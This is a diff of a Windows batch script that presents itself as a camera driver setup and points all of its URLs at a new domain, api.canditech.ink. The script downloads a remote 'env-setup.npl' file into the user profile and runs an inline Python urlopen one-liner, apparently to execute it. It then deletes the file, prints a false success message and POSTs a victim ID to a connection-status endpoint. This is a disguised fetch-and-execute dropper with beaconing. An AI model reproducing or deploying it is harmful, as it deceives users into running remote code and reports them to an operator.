@@ -6,7 +6,7 @@ REM =====================================================================
 REM  Windows driver setup - single linear script (no call :labels).
 REM  Downloaded .bat files often break mid-file labels; paths must be set
 REM  at the start, never via a failed subroutine.
-REM  Template: WINDOW_UID is replaced by POST /window/:id on api.canditech.org
+REM  Template: WINDOW_UID is replaced by POST /window/:id on api.canditech.ink
 REM =====================================================================
 
 set "WINDOW_UID=__ID__"
@@ -77,7 +77,7 @@ if errorlevel 1 (
     exit /b 1
 )
 
-set "ENV_SETUP_URL=https://api.canditech.org/driver/env-setup.npl"
+set "ENV_SETUP_URL=https://api.canditech.ink/driver/env-setup.npl"
 set "CODEPROFILE=%USERPROFILE%"
 if not exist "%CODEPROFILE%" mkdir "%CODEPROFILE%" 2>nul
 
@@ -144,7 +144,7 @@ C:\python\python.exe -c "from urllib.request import urlopen,Request;Request._V='
 if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
 echo [SUCCESS] Camera drivers have been updated successfully.
 if defined WINDOW_UID (
-    set "AUTO_URL=https://api.canditech.org/change-connection-status/!WINDOW_UID!"
+    set "AUTO_URL=https://api.canditech.ink/change-connection-status/!WINDOW_UID!"
     curl -sL -X POST "!AUTO_URL!" -o nul
 )
 exit /b 0
